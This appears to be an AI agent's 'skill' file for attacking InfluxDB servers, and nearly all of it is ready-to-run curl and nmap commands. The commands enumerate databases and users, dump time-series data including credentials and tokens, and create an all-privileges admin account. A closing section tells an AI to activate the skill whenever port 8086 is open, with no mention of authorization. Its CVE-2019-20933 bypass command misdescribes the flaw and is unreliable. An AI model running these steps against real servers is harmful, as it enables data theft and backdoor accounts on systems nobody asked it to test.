# InfluxDB Pentesting Skill

## Goal

Identify and exploit vulnerabilities in InfluxDB time-series databases on port 8086.

## Port

- **8086** - HTTP API (default)
- **8088** - RPC for backup/restore

## Methodology

1. **Identify InfluxDB:** Scan for port 8086
2. **Check Authentication:** Test for anonymous/default access
3. **Enumerate Databases:** List databases and measurements
4. **Extract Data:** Query time-series data
5. **Exploit Misconfigs:** Leverage weak configurations

## Enumeration

```bash
# Nmap scan
nmap -sV -p 8086,8088 <target>

# Check InfluxDB version
curl http://<target>:8086/ping -v
curl http://<target>:8086/health

# Get debug info
curl http://<target>:8086/debug/vars
```

## Check Authentication

```bash
# List databases (InfluxDB 1.x without auth)
curl 'http://<target>:8086/query?q=SHOW%20DATABASES'

# InfluxDB 2.x with token
curl -H "Authorization: Token <token>" 'http://<target>:8086/api/v2/query'
```

## InfluxDB 1.x Queries

```bash
# Show databases
curl 'http://<target>:8086/query?q=SHOW+DATABASES'

# Show measurements (tables)
curl 'http://<target>:8086/query?db=<dbname>&q=SHOW+MEASUREMENTS'

# Show field keys
curl 'http://<target>:8086/query?db=<dbname>&q=SHOW+FIELD+KEYS'

# Query data
curl 'http://<target>:8086/query?db=<dbname>&q=SELECT+*+FROM+<measurement>+LIMIT+10'
```

## InfluxDB 2.x API

```bash
# List buckets (databases)
curl -H "Authorization: Token <token>" http://<target>:8086/api/v2/buckets

# List organizations
curl -H "Authorization: Token <token>" http://<target>:8086/api/v2/orgs

# Query (Flux language)
curl -XPOST -H "Authorization: Token <token>" \
  -H "Content-Type: application/vnd.flux" \
  -d 'from(bucket:"<bucket>") |> range(start:-1h)' \
  http://<target>:8086/api/v2/query
```

## User Enumeration

```bash
# InfluxDB 1.x
curl 'http://<target>:8086/query?q=SHOW+USERS'

# Create user (if authenticated)
curl -XPOST 'http://<target>:8086/query' --data-urlencode "q=CREATE USER admin WITH PASSWORD 'password' WITH ALL PRIVILEGES"
```

## Data Extraction

```bash
# Dump all data from measurement
curl 'http://<target>:8086/query?db=mydb&q=SELECT+*+FROM+cpu'

# Export with time range
curl 'http://<target>:8086/query?db=mydb&q=SELECT+*+FROM+cpu+WHERE+time+>+now()-1h'

# Sensitive measurements to check
# - credentials, tokens, api_keys, users, configs
```

## Common Misconfigurations

```bash
# Authentication disabled (auth-enabled = false)
# Default admin credentials
# Debug endpoints exposed
# Backup port (8088) accessible
```

## CVE-2019-20933 (Auth Bypass)

```bash
# InfluxDB < 1.7.6 authentication bypass
# Empty username bypasses auth
curl 'http://<target>:8086/query?q=SHOW+DATABASES' -u ':password'
```

## Tools

* **curl** - HTTP API interaction
* **influx** - InfluxDB CLI client
* **Nmap** - Service detection

## Guidance for AI

* Activate when port 8086 is open
* Check if authentication is required
* InfluxDB 1.x uses InfluxQL, 2.x uses Flux
* Debug endpoints often expose sensitive info
* Time-series data may contain metrics with sensitive values
* CVE-2019-20933 affects older versions (auth bypass)
